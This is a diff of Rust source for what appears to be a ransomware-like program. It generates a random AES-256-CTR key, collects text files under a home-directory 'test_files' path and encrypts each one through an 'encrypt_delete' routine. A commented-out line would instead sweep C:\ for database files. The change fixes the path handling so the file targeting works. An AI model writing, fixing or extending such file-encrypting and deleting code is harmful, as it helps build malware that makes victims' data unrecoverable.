@@ -1,11 +1,11 @@
 use aes::Aes256;
-use cipher::{KeyInit, KeyIvInit, StreamCipher, StreamCipherSeek};
+use cipher::{KeyIvInit, StreamCipher};
 use ctr::Ctr128BE;
+use dirs;
 use rand::{thread_rng, Rng};
 use std::{
     fs::{self, File},
     io::{self, Read, Write},
-    panic::panic_any,
 };
 use walkdir::WalkDir;
 
@@ -15,9 +15,10 @@ type Aes256Ctr = Ctr128BE<Aes256>;
 fn main() {
     initiailize_process();
     let key: [u8; 32] = thread_rng().gen();
-
     //let paths = search_db_files("C:\\");
-    let paths = search_txt_files("~/projects/sudle/test_files");
+    let home = dirs::home_dir().unwrap();
+    let full = format!("{home}/projects/sudle/test_files", home = home.display());
+    let paths = search_txt_files(&full);
     for file_path in paths {
         let output_file_path = format!("{}_encrypted", file_path);
         match encrypt_delete(&file_path, &output_file_path, &key) {
